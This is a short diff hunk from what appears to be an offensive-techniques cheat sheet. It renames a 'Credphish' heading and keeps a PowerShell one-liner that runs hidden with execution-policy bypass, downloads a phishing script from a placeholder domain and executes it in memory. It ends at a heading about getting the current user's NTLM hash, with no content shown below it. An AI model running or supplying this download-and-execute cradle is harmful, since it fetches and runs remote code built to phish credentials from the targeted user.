@@ -1,5 +1,5 @@
 
-Credphish receiver:  
+Credphish:  
 ```powershell -ep bypass -WindowStyle hidden -c "Invoke-WebRequest -URI 'https://<domain>.com/phish.ps1'|iex"```
 
 Get NTLM-hash of current user:  
